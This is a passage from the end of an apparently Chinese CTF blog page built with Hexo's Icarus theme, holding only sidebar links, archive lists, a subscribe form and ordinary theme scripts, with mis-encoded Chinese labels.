æ–°æ˜¥çº¢åŒ…é¢˜1</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-27T14:09:46.000Z">2021-03-27</time></p><p class="title"><a href="/2021/03/27/GYCTF2020-Easyphp/">GYCTF2020 Easyphp</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">å½’æ¡£</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">å››æœˆ 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">ä¸‰æœˆ 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">äºŒæœˆ 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">ä¸€æœˆ 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">åäºŒæœˆ 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">åä¸€æœˆ 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">è®¢é˜…æ›´æ–°</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="è®¢é˜…"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2021 John Doe</span>Â Â Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>Â &amp;Â <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="å›åˆ°é¡¶ç«¯" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "æ­¤ç½‘ç«™ä½¿ç”¨Cookieæ¥æ”¹å–„æ‚¨çš„ä½“éªŒã€‚",
          dismiss: "çŸ¥é“äº†ï¼",
          allow: "å…è®¸ä½¿ç”¨Cookie",
          deny: "æ‹’ç»",
          link: "äº†è§£æ›´å¤š",
          policy: "Cookieæ”¿ç­–",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..."></div><a class="searchbox-close" href="javascript:;">Ã—</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ...","untitled":"(æ— æ ‡é¢˜)","posts":"æ–‡ç« ","pages":"é¡µé¢","categories":"åˆ†ç±»","tags":"æ ‡ç­¾"});
        });</script></body></html>